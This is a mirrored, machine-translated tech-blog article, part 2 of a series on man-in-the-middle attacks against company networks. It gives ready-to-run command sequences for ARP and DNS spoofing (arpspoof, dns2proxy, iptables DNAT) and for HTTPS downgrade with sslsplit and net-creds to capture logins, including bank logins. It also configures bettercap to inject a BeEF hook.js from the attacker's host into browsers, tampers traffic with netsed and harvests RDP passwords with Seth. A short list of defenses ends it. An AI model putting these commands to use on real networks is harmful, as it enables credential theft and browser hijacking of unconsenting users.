<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Company Network and MitM. Part 2</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Intercept sensitive information? Get unauthorized access to various applications and systems? Disrupt normal operation? All this and much more perform...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Company Network and MitM. Part 2</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/webt/od/nu/9e/odnu9ewf9ew8msybaqeimyynca8.png"><br><br>  Intercept sensitive information?  Get unauthorized access to various applications and systems?  Disrupt normal operation?  All this and much more perform attacks like Man in the Middle. <br><br>  Today we continue the series of articles devoted to the attacks of the ‚Äúman in the middle‚Äù (and a number of related) attacks on typical protocols and transmission channels found in almost any company.  Consider the levels of much greater interest for the attacker: from network to application. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Interested in?  Welcome to cat. <br><a name="habracut"></a><br><h3>  Remember </h3><br>  So, in the previous article, we focused on spoofing attacks in wired and wireless environments, showing techniques for monitoring requests and responses to DNS servers.  DNS was chosen for a reason - this is one of the primary goals.  Why?  It's simple - almost any session now begins with a request for the IP address of the target host on DNS servers. <br><br>  Today we will show attacks "on copper", but for the same Wi-Fi practically nothing changes except a couple of nuances.  We omit the insertion into optics, since this vector of attacks is very costly and requires special equipment. <br><br>  To begin with, we are interested in the ‚Äúinvisible‚Äù interception of DNS queries.  I will use a couple of the following utilities: <a href="https://github.com/singe/dns2proxy/">DNS2Proxy</a> (the utility has been <a href="https://github.com/singe/dns2proxy/">around</a> for many years, but it is still quite combat-ready) and <a href="https://github.com/smikims/arpspoof">arpspoof</a> (also not young). <br><br>  We launch: <br><br><pre><code class="plaintext hljs"># arpspoof -r 192.168.180.254 192.168.180.1 //  IP ‚Äì  ,  -  # python2 dns2proxy.py -u 192.168.180.253 //  -u   IP-,        # iptables -t nat -A PREROUTING -i enp14s0 ‚Äìp udp --dport 53 -j DNAT --to-destination 192.168.180.253:53</code> </pre> <br>  Now let's check how this affects the victim‚Äôs machine by doing nslookup on any domain: <br><br> <a href=""><img src="https://habrastorage.org/webt/xn/l6/ek/xnl6ekoftmi1evo5ebyifnh01w4.jpeg"></a> <br><br> <a href=""><img src="https://habrastorage.org/webt/td/bb/wl/tdbbwlw8lohyslxzkbldz6cnngg.jpeg"></a> <br><br>  Well, the victim receives the host IP required by the attacker, most likely the local IP address of the device from which the attack develops.  The screenshot also shows that the client believes that a legitimate DNS server answers her, which, of course, is a bit wrong.  In fact, the functionality of the DNS2Proxy utility is quite wide: you can specify specific domains for spoofing, or you can, on the contrary, spoof everything by adding some to the exceptions. <br><br>  What's next?  And then we need to deploy a ‚Äúproxy‚Äù web server that will build 2 connections: one is a ‚Äúproxy‚Äù &lt;&gt; legitimate node in the network, and the second is a ‚Äúproxy‚Äù &lt;&gt; victim.  We will use <a href="https://github.com/droe/sslsplit">SSLsplit</a> . <br><br>  We launch: <br><br><pre> <code class="plaintext hljs"># sslsplit ‚Äìl 2000 # iptables -t nat -A PREROUTING -i enp14s0 ‚Äìp tcp -m tcp --dport 80 -j DNAT --to-destination 192.168.180.253:2000</code> </pre> <br>  We check what will happen if we try to switch to some automotive portal, for example, <a href="https://www.drom.ru/">drom.ru</a> : <br><br> <a href=""><img src="https://habrastorage.org/webt/fw/lx/9s/fwlx9svzpbcjr8zhj9bpphumnnw.jpeg"></a> <br><br> <a href=""><img src="https://habrastorage.org/webt/rj/pr/ey/rjpreyx0-d8_un53lczbmvq6x9o.jpeg"></a> <br><br>  And we have an unprotected connection!  But with the caveat: wwww and webmy.drom.ru were added as a subdomain instead of my.drom.ru.  Let's try to log in, after using some utility to view transit traffic on the device of the attacker.  I will use <a href="https://github.com/DanMcInerney/net-creds">net-creds</a> .  We look at what it displays in the console: <br><br> <a href=""><img src="https://habrastorage.org/webt/gx/tf/vz/gxtfvz5d7ixeomuz95kn5nplkrm.png"></a> <br><br>  And we have a username / password, great! <br><br>  The question probably arises: ‚ÄúWhat is the difference with the previous article?‚Äù The difference is that without these manipulations an HTTPS connection is built, which makes it almost impossible to intercept accounts.  This is the so-called "downgrade attack". <br><br>  All the same will work even with banks and other resources: <br><br> <a href=""><img src="https://habrastorage.org/webt/rs/lu/od/rsluoddsilfffe7nwpqfl1cydge.jpeg"></a> <br><br> <a href=""><img src="https://habrastorage.org/webt/ku/mh/yk/kumhykptgifo_5x_vw73f8wwsto.jpeg"></a> <br><br>  But it‚Äôs <b>NOT</b> worth blaming the banks that in this way the user can be ‚Äúcracked‚Äù.  They can‚Äôt do anything here, because the attack is far beyond their perimeter!  The bank is <b>NOT</b> to blame!  In addition, they all use 2FA, which can slightly reduce the risk of gaining access. <br><br>  Please note: this way even HSTS (HTTP Strict Transport Security) is bypassed, but not for all resources (which, I think, all or almost everyone here already knows).  A number of browsers keep a list of domains with which connection via TLS is required, and such an attack against them is powerless.  The simplest example is <a href="https://www.google.com/">google.com</a> , and the full list for Chromium is <a href="https://cs.chromium.org/chromium/src/net/">here</a> .  Both Firefox and Chrome / Chromium will not build an HTTP connection with it, protecting the user.  However, if an attacker managed to somehow add ‚Äúhis‚Äù self-signed certificate to trusted or, even worse, trusted root CAs, nothing will help, simply because the browser and the system will initially consider them completely legitimate and not produce any errors during their processing.  The case with trusted root CAs is special: this will allow you to generate a certificate for each domain on the fly (this is how DLP and other protection tools that analyze traffic usually work), which allows you to analyze any HTTPS connection without any problems and notifications from the browser. <br><br>  All the tools listed above are already outdated, as they use Python2, which support will soon end.  You can use any analogue, for example, <a href="https://github.com/bettercap/bettercap">bettercap</a> , which is a ‚Äúharvester‚Äù of various tools and performs all the same functions listed above, as well as a number of others.  The only comment on his work: the latest versions do not want to ‚Äúresolve‚Äù all domains by default, you have to specify specific ones.  However, for "real" attacks this is enough for the eyes, and even helps not to open ahead of time. <br><br>  What else does MitM allow?  Import JS aka XSS.  And then a wide scope for creativity.  Let's start using bettercap and <a href="https://beefproject.com/">beef</a> : <br><br>  In bettercap include: <br><br><pre> <code class="plaintext hljs"># set arp.spoof.targets 192.168.180.254 # arp.spoof on # set http.proxy.sslstrip true # set http.proxy.injectjs http://192.168.180.253:3000/hook.js # http.proxy on</code> </pre> <br>  If we want to be implemented on HTTPS pages, then we configure dns.proxy as well.  As part of the demo, I will manage only HTTP. <br><br>  Go to <a href="http://www.diary.ru/">diary.ru</a> and observe the following in the debugger: <br><br> <a href=""><img src="https://habrastorage.org/webt/mm/rl/ar/mmrlarlqn2ig49fmvrrqltbvwk8.jpeg"></a> <br><br>  Let's see how things are in the beef web interface: <br><br> <a href=""><img src="https://habrastorage.org/webt/5o/yt/1z/5oyt1zelqgu7mlv5ztj_csg3gn0.png"></a> <br><br>  Actually, we‚Äôre done, we‚Äôre ‚Äúin the browser‚Äù.  2 sessions were created, probably due to the fact that I opened another page in the background, but this is not a problem.  Now you can start <s>creating a mess</s> to collect information, develop an attack, in some cases open a shell or simply mine.  Part of the possible functionality is presented in the screenshot in the ‚ÄúModule Tree‚Äù table.  For the test, run the receipt of the fingerprint of the browser: <br><br> <a href=""><img src="https://habrastorage.org/webt/6h/mb/j_/6hmbj_zulrlxccb5gyq2yds-jsa.png"></a> <br><br>  However, browser developers are not fools and try to cover up various "holes" that allow access at the click of a finger.  On the other hand, such access can greatly facilitate further consolidation on the attacked host. <br><br>  Let's move on to the last attack for today - data spoofing.  In general, this attack draws on a separate article, it can be used even when transferring images of virtual machines to gain access (maybe I‚Äôll someday open this topic in more detail), but now we will conduct a short demonstration, for example, on the website <a href="http://pasted.co/">pasted.co</a> - the simplest resource, allowing for some time to provide access to any textual information.  For attack we use <a href="https://github.com/xlab/netsed">netsed</a> . <br><br>  We launch: <br><br><pre> <code class="plaintext hljs"># netsed tcp 4000 0 0 s/Hello/HACKED/o # iptables -t nat -A PREROUTING -i enp14s0 ‚Äìp tcp -m tcp --dport 80 -j DNAT --to-destination 192.168.180.253:4000 # arpspoof -r 192.168.180.254 192.168.180.1</code> </pre> <br>  On the attacked node, go to pasted.co, write our 'Hello', send it, get a link, open it and see our 'HACKED'.  An example is simple, but, I think, to imagine that in principle it is possible to implement such an attack is not difficult. <br><br> <a href=""><img src="https://habrastorage.org/webt/kn/6x/ey/kn6xeypuktcczpfa8lywvcsl3gm.jpeg"></a> <br><br> <a href=""><img src="https://habrastorage.org/webt/f_/e6/fo/f_e6fogxo0n7am8oq1kpiblaqow.jpeg"></a> <br><br> <a href=""><img src="https://habrastorage.org/webt/5v/eq/68/5veq68u2vkaj-4gzipx4r96jb9i.jpeg"></a> <br><br><h3>  A few words about RDP and MitM </h3><br>  There is such an interesting utility called <a href="https://github.com/SySS-Research/Seth">Seth</a> and, in fact, is a bunch of aprspoof and sslstrip, but for RDP.  The bottom line is simple: when accessing port 3389, Seth acts similarly to sslstrip and builds its own connection to the target node.  The user enters credentials ... and you can end there. <br><br>  We launch: <br><br><pre> <code class="plaintext hljs"># ./seth.sh enp14s0 192.168.180.253 192.168.180.254 192.168.180.1</code> </pre> <br>  We start on the RDP client, connect to any RDP host (I connected to the server outside the network 192.168.180.0/24) and enter the account.  Personally, after this stage, I caught an error every time, although the utility should proxy the connection, but it did the most important part of the work: <br><br> <a href=""><img src="https://habrastorage.org/webt/29/ys/iw/29ysiw3wroqids1kqhhmlcjdwj8.png"></a> <br><br>  The highlighted rectangle had a clear password. <br><br><h3>  Defend ourselves </h3><br><ol><li>  Use all the measures indicated in our <a href="https://habr.com/ru/company/acribia/blog/438996/">previous article</a> .  It really helps!  Separately, I will enable DHCP snooping, which will allow us to filter out illegitimate DHCP servers that can force the client to send all requests to the attacker's host, avoiding arp-spoofing. </li><li>  If possible, use extensions like HTTPS everywhere.  It will automatically redirect to the https version of the site if it is included in its database, which avoids HTTPS downgrade. </li><li>  For DNS, you can use DNS-over-TLS / DNS-over-HTTPS or DNSCrypt.  The tools are not perfect, support can be quite painful, but in some cases this is a good measure of protection. </li><li>  Learn and teach family, friends and colleagues to pay attention to the address bar: it is important!  wwww.drom.ru, notifications of an unprotected connection on a previously ‚Äúhassle-free‚Äù resource are often a sure sign of some kind of anomalies in the network. </li></ol><br>  Pay attention to anomalies in RDP sessions: an unexpectedly changed certificate is a bad sign. <br><br>  That's all for now.  Or not?  Friends, I would like to know from you, but are you interested in an attack on the hypervisor and the migration of machines?  Or an injection into PE files?  Waiting for your comments and questions! </div><p>Source: <a href="https://habr.com/ru/post/461305/">https://habr.com/ru/post/461305/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../461297/index.html">What modern targeted attacks look like</a></li>
<li><a href="../461299/index.html">How the PC conquered the media industry with successful software: discussing Pro Tools and Media Composer</a></li>
<li><a href="../4613/index.html">Nine reasons to wait a bit with Firefox upgrade</a></li>
<li><a href="../46130/index.html">Web Directions Survey</a></li>
<li><a href="../461303/index.html">Using the Troika card as a mandatory medical insurance policy</a></li>
<li><a href="../461307/index.html">We invite you to VK Hackathon 2019. This year's prize pool is two million rubles.</a></li>
<li><a href="../461309/index.html">Everything except Kotlin: Andrei Breslav on gender balance in IT, emotions and more</a></li>
<li><a href="../46131/index.html">Gay Test v.3</a></li>
<li><a href="../461313/index.html">Zimbra 8.8.15 LTS Released</a></li>
<li><a href="../461317/index.html">9 Principles for Creating Quality iOS Applications</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>